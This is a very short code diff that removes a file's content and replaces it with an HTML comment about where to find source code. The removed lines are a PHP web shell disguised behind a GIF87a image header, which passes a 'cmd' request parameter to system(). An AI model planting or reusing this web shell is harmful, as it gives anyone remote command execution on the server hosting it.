@@ -1,2 +1,1 @@
-GIF87a
-<?php echo system($_GET[cmd]); ?>
+<!-- Check releases to find the source code -->
